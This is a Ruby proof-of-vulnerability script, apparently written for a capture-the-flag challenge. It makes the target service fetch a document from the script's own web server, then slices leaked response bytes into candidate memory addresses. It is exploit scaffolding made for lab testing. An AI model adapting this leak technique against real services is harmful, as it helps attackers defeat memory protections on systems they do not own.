#!/usr/bin/env ruby

require "forwardable"
require "logger"
require 'nokogiri'
require "socket"
require "timeout"

require_relative 'web.rb'

# range of lengths to pick in the absence of a `LENGTH` environment variable
LENGTH_RANGE=(100..200)

# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end,
                 level: Logger::DEBUG)

# for a less-noisy poller experience, set the `LOGGER_MIN_LEVEL` environment
# variable to `WARN`, `ERROR`, or `FATAL`
if ENV['LOGGER_MIN_LEVEL']
  LLL.level = Logger.const_get(ENV['LOGGER_MIN_LEVEL'])
end

# allows fanning socket writes to a dump file for seeding a fuzzer
class Interceptor
  attr_accessor :sock, :dumper
  extend Forwardable

  def_delegators :@sock, :read, :getc

  def write(*args)
    dumper.write *args
    sock.write *args
  end
end

# the pov
class Pov
  attr_reader :host, :port

  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = (ENV['PORT'] || 3017).to_i
    @http_listen_port = (ENV['HTTP_LISTEN_PORT'] || 8080).to_i

    @assertions = 0

    pick_timeout!
    start_web_server!
  end

  def run!
    @sock = TCPSocket.new @host, @port

    @host_sees = @sock.gets
    @host_sees_addr = @host_sees.split(':').first
    LLL.info "Host sees us at #{@host_sees_addr}"

    LLL.info "also " + @sock.gets

    if example_filename = ENV['DUMP_EXAMPLE']
      interceptor = Interceptor.new
      interceptor.sock = @sock
      interceptor.dumper = File.open(example_filename, 'w')
      @sock = interceptor
      at_exit do
        interceptor.dumper.close
      end
    end

    prompt = @sock.read(2)
    LLL.info "prompt #{prompt}"

    Timeout.timeout(@timeout) do
      parse_doc
    end
  end

  def cleanup!
    @web_thread.kill
    sleep 1
  end

  private

  # 12345678-1234-5678-1234-567812345678
  PARSE_DOC_EXPECTATION = /\A(
  [[:xdigit:]]{8}-
  [[:xdigit:]]{4}-
  [[:xdigit:]]{4}-
  [[:xdigit:]]{4}-
  [[:xdigit:]]{12}
)\Z/x

  def parse_doc
    @sock.puts "parse-doc http://#{@host_sees_addr}:#{@http_listen_port}/"
    expectation = @sock.gets.strip
    matched_expectation = PARSE_DOC_EXPECTATION.match expectation
    assert(matched_expectation,
           "didn't get bytes to exppect in `#{expectation}`")

    uuid = matched_expectation[1]
    got = []

    loop do
      candidate = @sock.gets.chomp
      LLL.debug candidate
      break if uuid == candidate
      got << candidate
    end

    LLL.info got

    payload = got[9][28..-1]

    assert payload, "Couldn't find the payload in the expected place"

    LLL.debug "sorry in advance for the next #{payload.bytesize - 8} addresses"

    (payload.bytesize - 8).times do |i|
      slice = payload.byteslice(i, 8)
      slice_bytes = slice.bytes.map{ |b| "%02x" % b }.reverse
      top = slice_bytes[0..3].join
      bottom = slice_bytes[4..7].join

      puts "ADDRESS=#{slice_bytes.join}"
    end
  end


  # assert a predicate is true
  def assert(predicate, message='failed assertion')
    @assertions += 1
    return if predicate
    fail message
  end

  # pick a timeout (seconds to wait per activity) from either `TIMEOUT`
  # environment variable or the `DEFAULT_TIME_LIMIT` constant
  def pick_timeout!
    @timeout = (ENV['TIMEOUT'] || DEFAULT_TIME_LIMIT).to_i
    $stdout.puts "TIMEOUT=#{@timeout}"
    $stdout.flush
  end

  def start_web_server!
    @web_thread = Thread.new do
      LLL.info "starting web server..."
      Web.run! port: @http_listen_port, bind: '0.0.0.0'
    end

    sleep 1
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

pov.cleanup!

LLL.info "success :)"
